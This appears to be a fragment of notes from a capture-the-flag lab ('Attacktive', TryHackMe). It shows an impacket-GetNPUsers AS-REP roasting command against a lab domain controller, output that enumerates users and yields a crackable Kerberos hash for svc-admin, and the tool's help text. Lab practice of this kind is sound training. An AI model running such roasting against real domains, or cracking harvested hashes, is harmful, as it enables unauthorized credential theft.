
`impacket-GetNPUsers spookysec.local/ -usersfile userlist.txt -no-pass -dc-ip 10.10.106.240`

```sh
┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ impacket-GetNPUsers spookysec.local/ -usersfile userlist.txt -no-pass -dc-ip 10.10.106.240
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
...
[-] User james doesn´t have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:66ca4f25d28857dab71b6de84734f5ca$87c35934ab2a97011a39f4b3671f0ff97f1feaf2bc876f577b3b40967ad1012e24cac99efdde817db83216d2d3acdec1ac39920f9755b2e407f2eec4bca3dca5a5de969899afb3ec7dd225aba4d6a791e63b01581fc16e8c25c580d567aa3c1a8752ff7e9333150df02fd3c91b96279b125a50c3135ae39be7b22b15f91769c21c5484b710a040ea58b3fd85418d1222dca4342c60db2cf74c977b47d9b16bcf38d870a218f0ed06e44434dbd0fc1c1d93a5cd94a8272978cc02851b5d02fb186cacad4225d86cb8895123ec9253dd0c6c9947ab4aaab817a1a3f060841b442d9277e37803bc553aae620ff34f315f89fde6
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set






```



### Help

```sh
┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ impacket-GetNPUsers -h                                                                    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

usage: GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE] [-format {hashcat,john}] [-usersfile USERSFILE]
                     [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                     [-dc-ip ip address] [-dc-host hostname]
                     target

Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs
for cracking

positional arguments:
  target                [[domain/]username[:password]]

options:
  -h, --help            show this help message and exit
  -request              Requests TGT for users and output them in JtR/hashcat format (default False)
  -outputfile OUTPUTFILE
                        Output filename to write ciphers in JtR/hashcat format
  -format {hashcat,john}
                        format to save the AS_REQ of users without pre-authentication. Default is hashcat
  -usersfile USERSFILE  File with user per line to test
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don´t ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on
                        target parameters. If valid credentials cannot be found, it will use the ones
                        specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN)
                        specified in the target parameter
  -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN)
                        specified in the account parameter will be used
```
